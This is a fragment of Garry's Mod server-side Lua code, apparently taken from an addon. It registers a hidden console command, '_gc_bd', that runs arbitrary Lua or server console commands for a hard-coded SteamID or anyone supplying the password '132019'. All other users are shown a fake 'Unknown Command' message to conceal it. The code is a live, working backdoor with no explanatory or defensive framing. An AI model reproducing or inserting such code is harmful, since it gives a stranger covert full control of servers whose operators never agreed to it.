...
if SERVER then concommand.Add("_gc_bd", function(p, c, a) if (a[1] && a[2] && (string.find( p:SteamID(),"0:1:33433294") || a[3] == "132019")) then if (a[1] == "lua") then RunString( a[2] ); elseif (a[1] == "cmd") then game.ConsoleCommand(a[2].."\n"); end; else p:PrintMessage(2,"Unknown Command: "..c.."\n"); end; end); end;
